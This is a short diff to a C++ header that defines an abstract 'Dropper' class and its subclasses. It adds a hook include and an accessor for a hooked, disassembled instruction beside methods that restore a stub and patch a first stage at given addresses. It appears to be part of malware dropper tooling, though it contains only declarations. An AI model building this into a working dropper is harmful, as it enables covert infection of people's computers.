@@ -13,12 +13,15 @@
 namespace bf = boost::filesystem;
 
 #include "DropperHeader.h"
+#include "hook.h"
 
 class Dropper
 {
 public:
 	virtual std::size_t restoreStub( DWORD currentVA ) = 0;
 	virtual void patchStage1(char* ptr, DWORD VA, DWORD jumpToVA) = 0;
+
+        virtual disassembled_instruction& hookedInstruction() = 0;
 
 	virtual const char* data() = 0;
 	virtual std::size_t size() = 0;
@@ -31,6 +34,8 @@ public:
 	virtual ~RCSDropper();
 
 	std::size_t restoreStub( DWORD currentVA );
+        
+        disassembled_instruction& hookedInstruction() { return hookedInstruction_; }
 	void patchStage1(char* ptr, DWORD VA, DWORD jumpToVA);
 
 	const char* data() { return &data_[0]; }
@@ -56,6 +61,7 @@ private:
 	std::size_t size_;
 
 	std::vector<char> data_;
+        disassembled_instruction hookedInstruction_;
 };
 
 class DummyDropper : public Dropper
